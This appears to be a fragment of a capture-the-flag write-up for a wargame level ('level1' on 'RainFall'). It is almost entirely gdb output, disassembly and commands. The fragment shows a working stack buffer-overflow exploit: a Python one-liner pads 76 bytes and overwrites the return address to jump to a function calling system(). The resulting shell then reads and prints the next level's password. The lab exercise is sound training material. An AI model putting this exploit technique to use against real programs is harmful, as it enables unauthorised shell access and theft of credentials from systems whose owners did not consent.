```
    gdb) run
    Starting program: /home/user/level1/level1 
    Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag

    Program received signal SIGSEGV, Segmentation fault.
    0x63413563 in ?? ()
``` 

```
```
   python3 -c 'print("A"*76 + "\x44\x84\x04\x08")'
```

```
    (gdb) disas run
    Dump of assembler code for function run:
    0x08048444 <+0>:     push   %ebp
    0x08048445 <+1>:     mov    %esp,%ebp
    0x08048447 <+3>:     sub    $0x18,%esp
    0x0804844a <+6>:     mov    0x80497c0,%eax
    0x0804844f <+11>:    mov    %eax,%edx
    0x08048451 <+13>:    mov    $0x8048570,%eax
    0x08048456 <+18>:    mov    %edx,0xc(%esp)
    0x0804845a <+22>:    movl   $0x13,0x8(%esp)
    0x08048462 <+30>:    movl   $0x1,0x4(%esp)
    0x0804846a <+38>:    mov    %eax,(%esp)
    0x0804846d <+41>:    call   0x8048350 <fwrite@plt>
    0x08048472 <+46>:    movl   $0x8048584,(%esp)
    0x08048479 <+53>:    call   0x8048360 <system@plt>
    0x0804847e <+58>:    leave  
    0x0804847f <+59>:    ret    
    End of assembler dump.
```

```
    level1@RainFall:~$ (python -c 'print("A"*76 + "\x44\x84\x04\x08")'; cat) | ./level1
    Good... Wait what?
    cat /home/user/level2/.pass     
    53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
```